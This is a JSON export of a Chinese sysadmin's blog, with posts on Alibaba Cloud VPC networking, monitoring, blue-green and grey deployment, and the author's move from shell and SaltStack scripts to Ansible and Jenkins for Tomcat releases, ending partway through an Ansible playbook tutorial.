{"meta":{"title":"Chengyang's Blog","subtitle":"The mountain road twists and turns, but after all, toward the peak extension.","description":"Personal blog, thinking and sharing of technology and life","author":"yangc","url":"http://blog.yangcvo.me"},"pages":[{"title":"","date":"2017-03-09T14:56:03.000Z","updated":"2017-03-09T14:56:03.000Z","comments":true,"path":"404.html","permalink":"http://blog.yangcvo.me/404.html","excerpt":"","text":"","raw":null,"content":null},{"title":"About","date":"2014-03-21T10:53:54.000Z","updated":"2017-03-12T17:16:40.000Z","comments":true,"path":"about/About-me.html","permalink":"http://blog.yangcvo.me/about/About-me.html","excerpt":"","text":"work experience:：122016-2 - ????.? 公司-上市公司美年大健康-旗下控股公司-优健康 2014.3 - 2016.2 公司-上市公司高升控股-旗下分公司MMtrix性能魔方 My dearest reader Welcome to my blog. I doubt you got to it by accident. With any luck, you got to it because of a search result. If so, I really hope I managed to answer any questions you may have had. With any luck on your part and skill on mine, you not only had your question answered, but had questions you didn’t know you had get answered as well! Not only that, but you stuck around long enough to visit this page and read about me. Thanks! My name is, as the site title says, chengyangyang. I went to school for computers and ended up learning about business instead. Sure enough, I thought I knew what I needed to run a successful business.I may have done alright, but it’s not for me. I need to be in front of a terminal emulator, not in front of a room full of people. That’s why I am where I am now. I’m a Linux server administrator. I’m passionate about the work I do and strive to learn more every day. From time to time I will run into weird and peculiar issues that take a lot of effort to solve. Sometimes I get questions that I have answered many times before. My blog is my repository for solutions and answers. My goal is to Keep IT DRY. Please check out that page for a complete description of what I mean. If you have something that I should add, let me know. I’m easy to find and always looking for new useful content! Here’s my contact: 📬 yangcvo[at]gmail.com 🐧 QQ:1165958741 个人简历：gurudigger 欢迎加我QQ和加入技术讨论群：Linux shell_高级运维派: 459096184Hadoop-Docker-虚拟化技术交流: 521621407 14年开始用的百家📖 iteye博客：http://yango.iteye.com -还有51CTO上面也有个人技术blog 现在统一已不更新了。 互相学习与交流加我QQ或者发mail给我。😊","raw":null,"content":null},{"title":"Archives","date":"2014-03-22T12:53:54.000Z","updated":"2017-05-04T16:06:04.000Z","comments":true,"path":"archives/archives.html","permalink":"http://blog.yangcvo.me/archives/archives.html","excerpt":"","text":"","raw":null,"content":null},{"title":"Tags","date":"2017-03-09T16:06:31.000Z","updated":"2017-03-09T16:06:31.000Z","comments":true,"path":"tags/index.html","permalink":"http://blog.yangcvo.me/tags/index.html","excerpt":"","text":"","raw":null,"content":null}],"posts":[{"title":"深度了解阿里云服务器经典网络和专有网络区别如何实现方案？","slug":"网络/深度了解阿里云服务器经典网络和专有网络区别如何实现方案？","date":"2017-04-10T09:56:03.000Z","updated":"2017-04-19T06:50:50.000Z","comments":true,"path":"2017/04/10/网络/深度了解阿里云服务器经典网络和专有网络区别如何实现方案？/","link":"","permalink":"http://blog.yangcvo.me/2017/04/10/网络/深度了解阿里云服务器经典网络和专有网络区别如何实现方案？/","excerpt":"","text":"深度了解阿里云服务器经典网络和专有网络区别？： 公司一开始购买阿里云服务器全部选择经典网络，机器现在数量较多，现在考虑到安全问题和管理上问题，所以公司决定在网络上管理自主控制从经典网络上迁移到专有网络，在这个过程我也了解了这两者的区别记录写下来，后面再讲如何实现迁移的过程。 在用户提交订单购买阿里云ECS云服务器时，会面临怎样选择网络类型的烦恼，阿里云服务器定制购买时，网络类型里的经典网络和专有网络（VPC）是什么含义，该怎样选择适合自己的网络类型呢？ 其实，阿里云官网已经给出了关于这两种网络的简单介绍： 网络类型：仅是 ECS 产品功能上区分，与运营商公网接入网络质量无关，任何网络类型的运营商接入均为 BGP 线路，请您放心使用，并根据自己需要进行选择。 经典网络： IP地址由阿里云统一分配，配置简便，使用方便，适合对操作易用性要求比较高、需要快速使用 ECS 的用户。 专有网络： 是指逻辑隔离的私有网络，您可以自定义网络拓扑和 IP 地址，支持通过专线连接。适合于熟悉网络管理的用户。 只不过，这个介绍对于很多人来讲，还是看的云里雾里，看完了也不知道该怎么选。 其实，可以这样简单地理解，从公网ip来讲，经典网络和专有网络没有区别；从内网ip来讲，经典网络是DHIP，也就是自动分配局域网ip地址，而专有网络则是手工分配局域网ip地址，这样方便有多台云服务器的用户自行定义内网ip结构。所以，如果用户只有一台服务器，或者有多台服务器但不需要进行内网互联，那么这两种网络都可以选择的。 但从实务上讲，因为经典网络是阿里云自动分配的ip地址，有一定的规律性，那么黑客也就可以利用内网ip进行局域网攻击，虽然在阿里云的安全体系下有些难度，但事实也证明了有被攻击的可能性。而专有网络因为是自定义局域网ip，那么黑客就没那么容易进入用户的内网进行攻击了。 那么为什么要有VPC呢：在vpc之前的网络类型就叫经典网络，VPC的主要作用为了解决用户在云端的安全隔离问题。 举个例子，我建在专有网络里的家，其他人到我家默认是没有路的。而建在经典网络里的家，其他人到我家是有路的，只不过路上被很多荆棘挡住了，所以经典网络存在被攻击的可能性。当然VPC还有很多其他好处，比如网络管理更灵活。 专有网络天生是隔离的安全网络，默认情况下，别人不能通过私网访问用户VPC，用户的VPC也不能通过私网访问别人。这里的别人包括：其他VPC和经典网络。 前面介绍到专有网络适合精通网络管理的用户，定制型可扩展型更强，那么用户利用VPC可以做些什么呢？ IP自主选择目前，阿里云VPC提供的IP地址有192.168.0.0/16，172.16.0.0/12和10.0.0.0/8。用户可以选择一段IP地址来识别云产品，同时可以把IP地址拆分成很多子网给不同的应用使用，能够做到很好的网络管理。 安全自主可控专有网络里没经过授权任何外部访问都是被禁止的网络内的成员（如ECS）默认也不能随便访问公网或者其他专有网络。成员之间（如ECS）默认可以通信，但管理员也可以对成员的通信进行管制（通过安全组）。 实现路由的自定义规则实现VPC内的路由控制 双可用区（机房）冗余备份把云产品放置在不同的可用区，这样万一一个可用区（机房）出现问题，另外一个可用区（机房）还可以继续服务。 实现多个云上多个VPC之间的访问为了安全，用户要将测试业务和生产业务分开，因此可以在云上建立两个VPC，A VPC 负责生产业务，B VPC负责测试业务，两个PVC之间默认不能通信。如果A VPC 负责生产业务，优先级高，需要经常访问B VPC，但反之则不行，这个时候就需要使用高速通道把A VPC 单向连到B VPC 就可以了。 实现云上VPC和云下IDC除了云上VPC，用户在云下自己的机房还有很多服务器，也可以使用高速通道把云上VPC和云下机房连起来。这就是现在流行的混合云。 小结所以，如果您就只有一台服务器，或者多台服务器之间不需要内网互联，那么怎样选择都可以，个人建议选择专有网络，后期管理更为简单。有内网互联需求，不需要自定义网络结构，也可以选择经典网络。 我们优先推荐客户使用VPC网络环境来部署应用系统，VPC下的网络环境会更灵活，安全更加有保证。 实现方案基础流程第一步： 在阿里云产品服务-专有网络VPC申请开通-在专有网络VPC上面选择专有网络-创建专有网络。 创建选择自己规定下一个网段，提供的IP地址有192.168.0.0/16，172.16.0.0/12和10.0.0.0/8 这里我选择192.168.0.0/16 创建完成点击管理。 专有网络-管理-查看路由器可以看到帮你生成出来两个路由器表，分别网段：192.168.1.0/24 100.64.0.0/10显示可用。专有网络-管理-查看交换机-选择创建交换机-填写交换机名称（hd_Switch_01）-选择地区-选择网段就可以了,这里显示252私有IP地址可用。 专有网络-管理-交换机-点击操作创建实例-分别有：创建ECS实例,创建RDS实例,创建SLB实例。-这里会自动跳转到自动义-选择地域-选择专有网络-选择对应的路由器ID和交换机ID。 实施方案图晚点更新画出。 架构解读：您可以在阿里云上创建一个专有网络，和其他租户的网络完全隔离。您可以完全掌控自己的虚拟网络，例如选择自己的 IP 地址范围、划分网段、配置路由表和网关等，从而实现安全而轻松的资源访问和应用程序访问。此外，您也可以通过专线或 VPN 等连接方式将您的专有网络与传统数据中心相连，形成一个按需定制的网络环境，实现应用的平滑迁移上云和对数据中心的扩展,使用VPC、RDS、ECS搭建云上业务系统，核心数据放置在云下自建数据中心，使用高速通道专线接入保证云上数据快速同步，实现云上云下数据互通，搭建一个混合云使用环境。","raw":null,"content":null,"categories":[{"name":"NetWork","slug":"NetWork","permalink":"http://blog.yangcvo.me/categories/NetWork/"}],"tags":[{"name":"NetWork","slug":"NetWork","permalink":"http://blog.yangcvo.me/tags/NetWork/"}]},{"title":"【翻译】监控不只是为了处理故障","slug":"运维笔记/【翻译】监控不只是为了处理故障","date":"2017-04-05T03:33:17.000Z","updated":"2017-04-17T10:16:56.000Z","comments":true,"path":"2017/04/05/运维笔记/【翻译】监控不只是为了处理故障/","link":"","permalink":"http://blog.yangcvo.me/2017/04/05/运维笔记/【翻译】监控不只是为了处理故障/","excerpt":"","text":"【翻译】监控不只是为了处理故障有一种普遍的想法认为监控只是在系统出错的时候能够发出报警，我们一直相信，监控系统的方方面面给予我们洞察业务内部机制的能力，并驱动我们做出决策。不同的人有不同的监控方式，手动查看日志，接受报警或者24x7值守查看各种图表。不管你用那种方式，最重要的是及时收到报错和警告。但是监控其实能做的更多。 监控不止用于故障时候发报警 监控系统不应该只是告诉你“这有一个问题”，它也要帮助你排查问题出现的原因,你不只是想在服务变慢的时候收到报警，你其实想知道过去几小时流量是否增加了，机器是不是宕机了，后端服务器是不是变慢了或者内部执行时间变长了。 在你的应用中集成监控模块 做为报警和排错重要手段，监控要在你的架构体系中拥有核心位置。要集成监控工具在你的所有代码逻辑中，而不仅仅是在边缘区域添加一点。跟踪每个请求提交api需要多少组件，以便你在设计新的存储系统是否能够知道要处理多少数据，跟踪内存的命中率，以便你能度量它们随着流量模式变化的规律，甚至分解到memcached中来节省内存和提高命中率。跟踪用户命中你的业务逻辑的”慢路径“，以便你知道它什么时候可以更快，并且当新的功能使用”慢路径“的时候，你已经准备好了让它”延迟命中“。在你的代码内部，做这样大量的细节工作，可以让你前进的更快，技术和产品决策会受益良多，根本上提升了你的效率。这就是监控的意义所在，监控不只是为了处理故障。 原文 https://www.robustperception.io/monitoring-not-just-for-outages/","raw":null,"content":null,"categories":[{"name":"运维笔记","slug":"运维笔记","permalink":"http://blog.yangcvo.me/categories/运维笔记/"}],"tags":[{"name":"Performance monitoring","slug":"Performance-monitoring","permalink":"http://blog.yangcvo.me/tags/Performance-monitoring/"}]},{"title":"APP自动化部署:开发部署-测试部署-灰度发布/蓝绿部署-生产环境等部署流程方案总结","slug":"运维笔记/APP自动化部署:开发部署-测试部署-灰度发布:蓝绿部署-生产环境等部署流程方案总结","date":"2017-03-15T03:33:17.000Z","updated":"2017-04-13T07:22:56.000Z","comments":true,"path":"2017/03/15/运维笔记/APP自动化部署:开发部署-测试部署-灰度发布:蓝绿部署-生产环境等部署流程方案总结/","link":"","permalink":"http://blog.yangcvo.me/2017/03/15/运维笔记/APP自动化部署:开发部署-测试部署-灰度发布:蓝绿部署-生产环境等部署流程方案总结/","excerpt":"","text":"APP自动化部署：开发部署、测试部署、灰度发布等部署方案对比与总结前言：个人现在在一个医疗行业公司：美年大这边负责体检APP的运维相关工作，今天主要是整理了下现在团队APP发布流程方案： 因为在项目迭代的过程中，不可避免需要”上线”。上线对应着部署，或者重新部署；部署对应着修改；修改则意味着风险。目前有很多用于部署的技术，有的简单，有的复杂；有的得停机，有的不需要停机即可完成部署。 个人整理下部署流程说明其实现在很多部署方法，现在我们用目前比较流行的几种部署方案，或者说策略方案对比总结简单讨论一下目前比较流行的几种部署方案，或者说策略。如有不足之处请指出，如有谬误，请指正^_^。 我们有自己开发环境和测试环境 ： 开发环境部署： 问题： 开发人员每个人在自己电脑环境写代码自己电脑本机测试代码是否run成功，每个开发人员都在自己本地写完测试出现问题是各自环境不统一导致遇到坑阻碍到测试人员测试，基础的bug也会浪费太多时间。 解决后： 主要是解决了给予开发团队在写代码或者修改bug可以第一时间更新部署。大家统一一个开发环境这个是为了在开发阶段能立马呈现效果。 测试环境部署： 问题： 一开始没有测试环境，直接开发环境当作测试环境去跑，发现很多问题，就是测试环境数据跟生产不一样，导致很多bug问题，测试发现测试的时候，开发在更新代码发布，耽误了测试人员的测试过程，环境不能独立都互相占用，刀子效率没有提高，bug每个星期都不断提升。 解决后： 主要解决了开发环境和测试环境独立，不会互相影响，测试人员有单独环境去测试生产能准确的数据对比。 选择灰度环境部署方案：先贴个百度百科： 灰度发布是指在黑与白之间，能够平滑过渡的一种发布方式。AB test就是一种灰度发布方式，让一部分用户继续用A，一部分用户开始用B，如果用户对B没有什么反对意见，那么逐步扩大范围，把所有用户都迁移到B上面来。灰度发布可以保证整体系统的稳定，在初始灰度的时候就可以发现、调整问题，以保证其影响度。 灰度环境部署: 个人理解灰度部署是增量发布的一种类型，它的执行方式是在原有软件生产版本可用的情况下，同时部署一个新的版本。同时运行同一个软件产品的多个版本需要软件针对配置和完美自动化部署进行特别设计。 1234567(1) 准备好部署各个阶段的工件，包括：构建工件，测试脚本，配置文件和部署清单文件。(2) 从负载均衡列表中移除掉“部署灰度环境”服务器。(3) 升级“灰度部署”应用（排掉原有流量并进行部署）。(4) 对应用进行自动化测试。(5) 将“灰度环境”服务器重新添加到负载均衡列表中（连通性和健康检查）。(6) 如果“灰度环境”在线使用测试成功，升级剩余的其他服务器。（否则就回滚）灰度发布中，常常按照用户设置路由权重，例如90%的用户维持使用老版本，10%的用户尝鲜新版本。不同版本应用共存，经常与A/B测试一起使用，用于测试选择多种方案。灰度发布比较典型的例子 第1步: 把绿色集群的状态改为’备用’. 从负载均衡的池里把这些地址去掉,这样,绿色的集群就不再回接收到来自用户的请求了.转而进入备用负载均衡的池里. 选择蓝绿环境部署方案：蓝绿发布的意义整个发布过程，用户没有感受到任何宕机或者服务重启。 蓝绿发布的过程 第0步:部署以前的配置.png) 第1步: 把绿色集群的状态改为’备用’. 从负载均衡的池里把这些地址去掉,这样,绿色的集群就不再回接收到来自用户的请求了.转而进入备用负载均衡的池里..png) 第2步:在绿色集群里部署新的代码,直到应用启动成功.png) 第3步:使用备用负载均衡简单测试一下备用集群的部署情况.理想状态下是全自动的. 第4步:把绿色备用集群的状态改成存货,于是进入了存活负载均衡的池里.png)看到 蓝色运行v1版本,绿色运行v2版本,都连接的是相同的数据库.这意味着v2版本也要在老的数据模型上运行.如果数据库有变更,要等到所有的集群升级到新的代码上. 第5步: 对蓝色集群也进行同样的操作..png).png) 最终v2代码完成部署..png) 第6步:根据情况.运行数据库迁移 参考：tks green-deployment 总结：1) 蓝绿部署：不停止老版本，额外搞一套新版本，等测试发现新版本OK后，删除老版本。其实这里删除老版本也就是重新部署了老版本成为新版本一起放上去，等需要更新发布迁下期中一个版本环境部署：现在我们公司使用蓝绿部署方案。 3) 灰度发布：不停止老版本，额外搞一套新版本，常常按照用户设置路由权重，例如90%的用户维持使用老版本，10%的用户尝鲜新版本。不同版本应用共存，经常与A/B测试一起使用，用于测试选择多种方案。 其实两种含义个人认为相差不是特别大，都特别适合现在发布部署流程方案。","raw":null,"content":null,"categories":[{"name":"运维笔记","slug":"运维笔记","permalink":"http://blog.yangcvo.me/categories/运维笔记/"}],"tags":[{"name":"Automation Deploy","slug":"Automation-Deploy","permalink":"http://blog.yangcvo.me/tags/Automation-Deploy/"}]},{"title":"运维自动化总结-记录帮助公司自动化架构演变过程","slug":"自动化+可视化/运维自动化/运维自动化总结-记录帮助公司自动化架构演变过程","date":"2017-03-14T03:34:17.000Z","updated":"2017-03-28T11:09:04.000Z","comments":true,"path":"2017/03/14/自动化+可视化/运维自动化/运维自动化总结-记录帮助公司自动化架构演变过程/","link":"","permalink":"http://blog.yangcvo.me/2017/03/14/自动化+可视化/运维自动化/运维自动化总结-记录帮助公司自动化架构演变过程/","excerpt":"","text":"运维自动化个人总结-记录自己自动化运维技术提升👍前言：个人2014年开始玩自动化的也是刚从业自动化运维岗位第一份工作，在一家上市公司做IDC+APM+CDN做云加速的应该很多玩cdn的都听说这家公司－mmtrix.com。 一开始开始深度学习的是SaltStack所以掌握的比较深更加熟练，其实也是一个好朋友推荐我看了一本书python入门到精通 里面有详细讲到salt安装和使用部署自动化各种操作，的确很方便。后面在测试环境我自己管理几十台服务器－学习使用Ansible去操作，因为salt跟ansible最大的区别，除了ansible快速上手和不需要复杂的安装，主要在内网方面比salt更稳定架构也比salt好。 在线上我们都是用salt去操作的，可是当时公司还没有运维开发的人员，所以后来salt在终端操作出了很多错： 12第一：人员操作失误一次，可能会导致所有的服务器都会受影响。第二：命令太多服务权限需要一一统一分配登陆终端操作。 那时候服务器有500多台那时候运维操作起来还是挺费力的。 经历：2016年初3月份去参加360的一次运维大会，王浩宇360的运维开发人员分享了一片文章：大规模集群上的多业务线环境部署. 讲的非常好，用的是Puppet去实现3000多台的服务器部署，指定部署安装包等等。非常方便。 这里也在Infoq上面有他的分享作品我这里粘贴出来了：大规模集群上的多业务线环境部署 个人现在运维自动化演变过程经验：我现在在一家上市公司旗下控股医疗大数据子公司负责运维部门，负责IT网络安全办公：主要做的应用运维和网络运维，兼大数据运维。 第一个版本公司整体服务架构： 2016年2月份脚本形式自动化发布：16年2月份这里的Tomcat自动化 发布我一开始使用shell脚本去实现自动化发布和回滚。 2016年4月份salt自动化远程控制脚本发布：16年4月份这里的tomcat服务增多，发现脚本发布手工操作太繁琐，而且出现问题几率大，效率不高。每次一次大版本改动发布会出现很多问题。 这里跟随服务模块增多，现在服务器90多台，统一salt自动化调用每台对应脚本发布回滚。 这里贴上我写的salt结合调用脚本命令，写在发布机器上面。这样就不需要进入机器每台执行对应发布脚本。 12345678910111213141516171819202122232425262728293031323334353637383940414243#!/bin/bash#author chengyangyang#2016年5月25日#this script is only for CentOS 6#check the OS#This script is used for the project release, which needs to be run by the root userplatform=`uname -i`if [ $platform != \"x86_64\" ];thenecho \"this script is only for 64bit Operating System !\"exit 1fiecho \"the platform is ok\"version=`cat /etc/redhat-release |awk '&#123;print substr($3,1,1)&#125;'`if [ $version != 6 ];thenecho \"this script is only for CentOS 6 !\"exit 1ficat &lt;&lt; EOF+----------------------------------------+| your system is CentOS 6 x86_64 || start Update release tomcat....... |+----------------------------------------+EOF#To determine whether the root permissionsif [ \"$UID\" != '0' ]then echo 'Permission denied, please switch the root tomcat.' exit 60fisalt \"node\" cmd.run \"curl -O http://10.47.100.90/ihaozhuo/war/haozhuo-tomcat.war\"[ $? -ne 0 ] &amp;&amp; exit 1salt \"node\" cmd.run \"md5sum haozhuo-tomcat.war\"[ $? -ne 0 ] &amp;&amp; exit 1salt \"node\" cmd.run \"mv haozhuo-tomcat.war java_war/\"[ $? -ne 0 ] &amp;&amp; exit 1salt \"node\" cmd.run \"sh /root/update/tomcat.sh\"[ $? -ne 0 ] &amp;&amp; exit 1salt 'node' cmd.run '/etc/init.d/tomcat-tomcat stop' env='&#123;\"LC_ALL\": \"zh_CN.UTF-8\"&#125;'salt 'node' cmd.run '/etc/init.d/tomcat-tomcat start' env='&#123;\"LC_ALL\": \"zh_CN.UTF-8\"&#125;'[ $? -ne 0 ] &amp;&amp; exit 1 2016年5月份去除了salt替换更新Ansible + Jenkins+Maven＋Nginx搞定自动发布，构建程序的持续集成平台Ansible vs SaltStack 对比？1. 自身运维SaltStack需要在Master和Minion主机启动守护进程，自身需要检测守护进程的运行状态，增加运维成本。Ansible和远端主机之间的通信是通过标准SSH进行，远程主机上只需要运行SSH进程就可以进行运维操作，SSH是机房主机中一般都安装和启动的进程，所以在Ansible进行运维的时候只需要关注Ansible主机的运行状态。Ansible对机房运维不会增加过多的运维成本。从工具本身的运维角度来说，Ansible要比SaltStack简单很多。 2. 使用语法Ansible的Playbook语法要比SaltStack的State语法具有更好的可读性。在使用的过程中发现Ansible在实现loop的更加的简洁，也可以使用相对路径。 同样Ansible的Notify模块和Handler模块实现的功能和SaltStack的watch和module.wait的模块实现功能也类似，也比SaltStack要简洁明了。 总之，Ansible的安全性能比SaltStack好，自身运维简单，使用语法可读性更强，虽然在响应速度方面不如SaltStack，但是在大部分应用场景下Ansible的响应速度能满足需求。因此，在金融行业的自动化运维系统，Ansible工具是最好的选择。 对应模块 account.yml 在Jenkins自动化写上变量对应.yml前缀名称。这里依然调用脚本去跑。 12345678910111213141516- hosts: tomcat-account_01 environment: LC_ALL: zh_CN.UTF-8 LANG : zh_CN.UTF-8 tasks: - name : cpfile-account copy : src=/root/.jenkins/workspace/yjk_master/haozhuo/haozhuo-account/target/haozhuo-account.war dest=/root/java_war/haozhuo-account.war - name : restart shell : /root/update/account.sh async : 0 - name : shutdown shell : /srv/tomcat/tomcat_account/bin/shutdown.sh async : 0 - name : start shell : chdir=/srv/tomcat/tomcat_account/bin nohup ./startup.sh &amp; async : 0 2016年6月份在ansible改进yml代码语法。去除了每台服务器新增发布脚本，这个过程太过于复杂，统一一台发布机处理即可。这里我贴出yml代码 Jenkins直接调用相应模块发布，自然会去执行对应yml代码。每台服务器不需要放发布回滚脚本。 123456789101112131415161718192021222324252627282930313233343536---- hosts: all environment: LC_ALL: zh_CN.UTF-8 LANG : zh_CN.UTF-8 vars:#jenkins-打包目录 TESTWAR: /root/java_war/haozhuo-family.war#生产环境中项目的tomcat所在的位置 OLDHOME: /srv/tomcat/tomcat_family/webapps/ROOT#生产环境中老版本项目所在webapps备份目录的位置 backupwebapps: /srv/tomcat/tomcat_family/warbackup#从jenkins-打包环境获取的新版本war包所在的位置 NEWWAR: /root/java_war/#生产环境中项目war包的名字 WARNAME: haozhuo-family.war#kill服务type路径 DOWNFILE: /srv/tomcat/tomcat_family tasks: - name: copy-war-file copy: src=&#123;&#123; TESTWAR &#125;&#125; dest=&#123;&#123; NEWWAR &#125;&#125; - name: mkdir-bakwar-file file: path=&#123;&#123; backupwebapps &#125;&#125; state=directory owner=tomcat group=tomcat mode=755 - name: bakwar-file shell: \"cp -r &#123;&#123; OLDHOME &#125;&#125; &#123;&#123; backupwebapps &#125;&#125;\" - name: unzip war. unarchive: src=&#123;&#123; NEWWAR &#125;&#125;/&#123;&#123; WARNAME &#125;&#125; dest=&#123;&#123; OLDHOME &#125;&#125; - name: stop-tomcat-service shell: \"ps -ef |grep &#123;&#123; DOWNFILE &#125;&#125; |grep -v grep |awk '&#123;print $2&#125;' |xargs kill -9\" ignore_errors: yes async: 0 - name: start-tomcat-service-nohup shell: chdir=&#123;&#123; DOWNFILE &#125;&#125;/bin nohup ./startup.sh &amp; 3. 总结在金融领域中，安全是最重要的考虑因素，在众多自动化运维工具种，Ansible的安全性能最好，是目前最适合金融领域的自动化运维工具。本文通过将Ansible微服务化，集成到自动化运维平台中，实现自动化运维平台高并发执行运维操作场景和实时收集执行结果。 2016年7月份Jenkins上面实现持续集成这里Jenkins打通gitlab自动发布，审计代码。 这里结合openVPN+谷歌二次动态认证效果给予开发他们开放环境。架构图 ： 2016年9月份公司架构演变从传统架构更换dubbo架构。公司应用服务架构图这里贴出来：Dubbo架构设计详解 系统架构图这里我后期在更新贴出来。 2017年3月份 公司服务器150台服务自动化发布。后面运维开发开发了一套基于salt自动化一套web版的管理平台。对我们后面的做部署初始化的确减轻了很多。现在开始公司用的是ansible基python开发出来一套自动化部署的。发布部署测试一体系：刚开发出来的截了一张图： 个人总结：系统标准化：要想自动化，首先第一就是标准化。比如软件的安装位置、版本、脚本，注册到init.d下面，这些应该是标准的，所有服务器都统一的。或者说你使用salt就是为了达到这样的标准化做自动化运维要经历的标准化–&gt;&gt;自动化—-&gt;&gt;服务化—-&gt;&gt;数据化。 个人意见： 只有标准了，才能自动，至少你相同的业务都应该是一样的。 自动化，这个自动化讲的是工具，所有的操作是工具再做，不是人。也有小公司说我们半自动，的确是有的，就写写脚本然后靠工具去管理。 服务化，你平台搞的很牛逼了，直接给业务提供接口。DNS、负载均衡、分布式存储、你都封装好了，上层不需要关心，你相当于为上层服务提供服务。各种API都写好了。 数据化，或者说可视化，运维平台做的很牛逼，直接对业务负责，以业务为导向，今天订单量减少了，通过你的运维平台，直接定位问题，不需要各种查找，因为订单量的减少，肯定有相关的监控指标发生变化。 那么在工具自动化建设的开始，你需要有一个理论支持，比如ITIL。不能瞎搞。没有流程的自动化运维就是耍流氓如果上线没有走上线流程，动不动，开发自己登录服务器执行了git pull。那还自动化什么呢。 我个人的概念就是生产就是咱们运维的地盘。谁都不能动。开发想动，你可以提供接口，或者提供平台让开发点点鼠标就可以了。 题外话：说个很蛋疼的事情，之前刚来这边负责创业公司运维岗位，技术团队开发人员都可以随便要权限，然后解决问题运维不用参与都是开发去操作。所以后来我进那家创业公司之间权限这些都是避免了。统一管理，统一分配，不同部门，不同岗位，不同权限。 这里我写过一篇文章：中小公司员工统一用户认证方案 这个是自动化里面最常见的部署自动化，对于ITIL的流程就是发布与部署管理。构建---打包---测试---发布都需要是自动的；所以这块需要测试的支持。需要有自动化测试。没有就卡到测试了。最简单的就是发布流程和开发流程分开。 自动化运维减轻了很多的事情，也让更多的运维小伙伴可以研究更多的知识。这篇文章也是自己对这两年多运维的这一方面的自动化运维的总结。","raw":null,"content":null,"categories":[{"name":"automation","slug":"automation","permalink":"http://blog.yangcvo.me/categories/automation/"}],"tags":[{"name":"Automation","slug":"Automation","permalink":"http://blog.yangcvo.me/tags/Automation/"}]},{"title":"Ansible-Playbook高级语法运用","slug":"自动化+可视化/Ansible/Ansible-Playbook高级语法运用","date":"2017-02-10T09:56:03.000Z","updated":"2017-03-23T14:52:47.000Z","comments":true,"path":"2017/02/10/自动化+可视化/Ansible/Ansible-Playbook高级语法运用/","link":"","permalink":"http://blog.yangcvo.me/2017/02/10/自动化+可视化/Ansible/Ansible-Playbook高级语法运用/","excerpt":"","text":"Ansible 官网学习：免费下载的ANSIBLE WHITEPAPER ansible高级白皮书 Ansible简介, 111分钟的学习视频官网 Ansible自动化平台演示,演示 我在官网学习📚书籍 ，这里也是官网推荐我贴了3本，需要自己去下载： Ansible for DevOps, by Jeff GeerlingFREE BOOK SAMPLE Extending Ansible eBook Preview , Extending Ansible ,by Rishabh DasFREE BOOK SAMPLE Mastering Ansible ebook , Mastering Ansible , by Jesse KeatingFREE BOOK SAMPLE 这里我主要应用到Ansible-Playbook 比较多，一开始学ansible是因为运维这块需要用到自动化，以前自动化发布等等都是用shell,python复杂性的去完成，shell去实现部署一个环境，要完成多台机器之前采用，salt去实现效果，发现在公司一个大型的架构演变salt支撑不了，而且需要网络稳定性高，他们的自动化控制是用agent去控制的，需要控制的机器都要修改和配置安装agent,ansbile就不需要。 在Ansible中，我们就充当编剧的角色，亲自编写剧本（一系列的服务器操作），让一出出精彩的戏剧（play）巧妙配合，完成对服务器的一系列精确控制。 1.1 Playbook语法简介Playbook采用一种可读性很高的且容易被人类阅读的语法的YAML语法编写，YAML: &quot;YAML Ain&#39;t a Markup Language&quot;（YAML不是一种置标语言）。该语言在被开发时，YAML 的意思其实是：”Yet Another Markup Language”（仍是一种置标语言），格式如下所示： 123456789101112131415house: family: name: Doe parents: - John - Jane children: - Paul - Mark - Simone address: number: 34 street: Main Street city: Nowheretown zipcode: 12345 这里语法报错有的如果按shell脚本直接去写的话就会出错： 报错： [WARNING]: Consider using unarchive module rather than running unzip 12345678910111213141516171819[root@ansible_01 ~]# ansible-playbook famly.yml---PLAY [all] *********************************************************************TASK [setup] *******************************************************************ok: [192.168.1.209]TASK [copy-war-file] ***********************************************************ok: [192.168.1.209]TASK [unzip war.] **************************************************************changed: [192.168.1.209] [WARNING]: Consider using unarchive module rather than running unzipPLAY RECAP *********************************************************************192.168.1.209 : ok=3 changed=1 unreachable=0 failed=0 原这里famly.yml写这里解压步骤： 12- name : 解压/root/java_war/api.war包在/home/app/newwar/api目录 shell : unzip -oq &#123;&#123; famly_war &#125;&#125; -d &#123;&#123; app_war &#125;&#125;/webapps/ 修改以后： 12- name: unzip war. unarchive: src=/root/java_war/haozhuo-family.war dest=/srv/ 经过以上更改后，软件包可以正常在client解压，不再报错。 2、特点YAML的可读性好 YAML和脚本语言的交互性好 YAML使用实现语言的数据类型 YAML有一个一致的信息模型 YAML易于实现 YAML可以基于流来处理 YAML表达能力强，扩展性好 YAML的语法和其他高阶语言类似，并且可以简单表达清单、散列表、标量等数据结构。其结构（Structure）通过空格来展示，序列（Sequence）里的项用”-“来代表，Map里的键值对用”:”分隔。下面是一个示例。 123456789101112131415161718- hosts: 10.1.0.1 #定义主机 vars: #定义变量 var1: value var2: value tasks: #定义任务 - name: #任务名称。 #这里就可以开始用模块来执行具体的任务了。 handlers: #定义触发通知所作的操作。里面也是跟tasks一样，用模块定义任务。 - name: remote_user: #远程主机执行任务时的用户。一般都是root，一般也不用指定。- hosts: web vars: tasks: handlers: remote_user: YAML文件扩展名通常为.yaml，如family.yaml 2.playbook的基础组件：12345678Hosts：运行指定任务的目标主机；remote_user：在远程主机以哪个用户身份执行； sudo_user：非管理员需要拥有sudo权限；tasks：任务列表 模块，模块参数： 格式： (1) action: module arguments (2) module: arguments 示例1： vim test.yaml 也可以是 .yml 123456789101112131415161718- hosts: tomcat_01 #运行指定任务的目标主机； remote_user: root #在远程主机以哪个用户身份执行；root tasks: - name: install a group group: name=mygrp system=true - name: install a user user: name=user1 group=mygrp system=true # 这里-name: graoup: 都要对齐，不然会提示语法出错。 - hosts: websrvs remote_user: root tasks: - name: install httpd package yum: name=httpd - name: start httpd service service: name=httpd state=started 3.运行playbook，使用ansible-playbook命令(1)检测语法 1ansible-playbook –syntax-check /path/to/playbook.yaml (2)测试运行 12345ansible-playbook -C /path/to/playbook.yaml --list-hosts --list-tasks --list-tags 这里简单结合shell演变写安装nginx: 123456789101112131415161718- name: copy nginx package copy: src=nginx-1.10.0-1.el7.ngx.x86_64.rpm dest=/tmp/nginx-1.10.0-1.el7.ngx.x86_64.rpm- name: install nginx package yum: name=/tmp/nginx-1.10.0-1.el7.ngx.x86_64.rpm state=present- name: install nginx.conf file template: src=nginx.conf.j2 dest=/etc/nginx/nginx.conf tags: ngxconf notify: reload nginx service- name: install default.conf file template: src=default.conf.j2 dest=/etc/nginx/conf.d/default.conf tags: ngxconf notify: reload nginx service- name: start nginx service service: name=nginx enabled=true state=started 自动化部署Tomcat服务。 123456789101112131415161718192021222324252627282930313233343536---- hosts: all environment: LC_ALL: zh_CN.UTF-8 LANG : 